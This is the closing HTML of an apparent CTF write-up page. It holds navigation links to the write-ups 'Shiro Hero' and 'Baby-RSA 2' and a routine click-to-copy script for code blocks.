    
      <a href="/docs/writeups/l3akctf/shirohero/" class="flex align-center book-icon">
        <img src="/svg/backward.svg" class="book-icon" alt="Previous" title="Shiro Hero" />
        <span>Shiro Hero</span>
      </a>
    
    </span>
    <span>
    
      <a href="/docs/writeups/dawgctf/baby-rsa2/" class="flex align-center book-icon">
        <span>Baby-RSA 2</span>
        <img src="/svg/forward.svg" class="book-icon" alt="Next" title="Baby-RSA 2" />
      </a>
    
    </span>
  </div>
  




  <script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script>


 
        
      </footer>

      
  
  <div class="book-comments">

</div>
  
 
      <label for="menu-control" class="hidden book-menu-overlay"></label>
    </div>

    

 
  </main>

  
</body>
</html>
















